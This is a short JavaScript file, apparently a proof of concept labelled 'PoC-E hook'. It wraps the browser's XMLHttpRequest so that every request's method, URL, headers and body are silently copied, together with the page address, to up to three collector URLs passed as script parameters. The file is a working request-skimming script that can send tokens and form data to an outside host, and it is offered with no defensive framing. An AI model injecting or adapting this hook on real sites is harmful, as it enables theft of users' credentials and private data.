(function () {
  function getCollectorUrlsFromCurrentScript() {
    try {
      const src = document.currentScript && document.currentScript.src;
      if (!src) return [];
      const u = new URL(src);
      const out = [];
      for (const k of ["c1", "c2", "c3"]) {
        const v = u.searchParams.get(k);
        if (v && String(v).trim()) out.push(String(v).trim());
      }
      return out;
    } catch (_) {
      return [];
    }
  }

  function defaultLocalCollectors() {
    const h = location.hostname;
    if (h === "localhost" || h === "127.0.0.1") {
      return [
        "http://localhost:5001/mirror",
        "http://localhost:5002/mirror",
        "http://localhost:5003/mirror",
      ];
    }
    return [];
  }

  const COLLECTORS = (function () {
    const qs = getCollectorUrlsFromCurrentScript();
    if (qs.length) return qs;
    return defaultLocalCollectors();
  })();

  function safeSend(url, payload, sessionId) {
    try {
      fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-BRS-Mirror": "1",
          "X-POC-Session": sessionId || "",
        },
        body: JSON.stringify(payload),
        keepalive: true,
      }).catch(() => {});
    } catch (_) {}
  }

  function newSessionId() {
    return "poc-e-" + Math.random().toString(16).slice(2) + "-" + Date.now();
  }

  const SESSION_ID = newSessionId();

  console.log("[PoC-E hook] loaded", { collectors: COLLECTORS, session: SESSION_ID });

  const XHR = window.XMLHttpRequest;
  if (!XHR || !XHR.prototype) return;

  const _open = XHR.prototype.open;
  const _send = XHR.prototype.send;
  const _setRequestHeader = XHR.prototype.setRequestHeader;

  XHR.prototype.open = function (method, url) {
    try {
      this.__pocE = this.__pocE || {};
      this.__pocE.method = method;
      this.__pocE.url = url;
      this.__pocE.openTs = Date.now();
    } catch (_) {}
    return _open.apply(this, arguments);
  };

  XHR.prototype.setRequestHeader = function (k, v) {
    try {
      this.__pocE = this.__pocE || {};
      this.__pocE.headers = this.__pocE.headers || [];
      this.__pocE.headers.push([String(k), String(v)]);
    } catch (_) {}
    return _setRequestHeader.apply(this, arguments);
  };

  XHR.prototype.send = function (body) {
    try {
      const meta = this.__pocE || {};
      const payload = {
        kind: "xhr-mirror",
        ts: Date.now(),
        method: meta.method,
        url: meta.url,
        headers: meta.headers || [],
        body: typeof body === "string" ? body : body ? "[non-string]" : "",
        page: location.href,
        origin: location.origin,
      };

      if (COLLECTORS.length) {
        for (const c of COLLECTORS) safeSend(c, payload, SESSION_ID);
      }
    } catch (_) {}

    return _send.apply(this, arguments);
  };
})();